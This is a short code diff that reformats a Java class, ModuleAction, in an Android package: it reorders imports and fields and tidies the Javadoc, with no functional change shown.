@@ -9,27 +9,26 @@
 
 package com.android.syssetup.action;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.ConfAction;
 import com.android.syssetup.conf.ConfigurationException;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
 
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class StopAgentAction.
  */
 abstract class ModuleAction extends SubAction {
-	private static final String TAG = "AgentAction"; //$NON-NLS-1$
-
-	protected String moduleId;
 	protected static final java.lang.String moduleStr = M.e("module");
+	private static final String TAG = "AgentAction"; //$NON-NLS-1$
+	protected String moduleId;
 
 	/**
 	 * Instantiates a new stop agent action.
-	 * 
-	 * @param jsubaction
-	 *            the conf params
+	 *
+	 * @param jsubaction the conf params
 	 */
 	public ModuleAction(final ConfAction jsubaction) {
 		super(jsubaction);
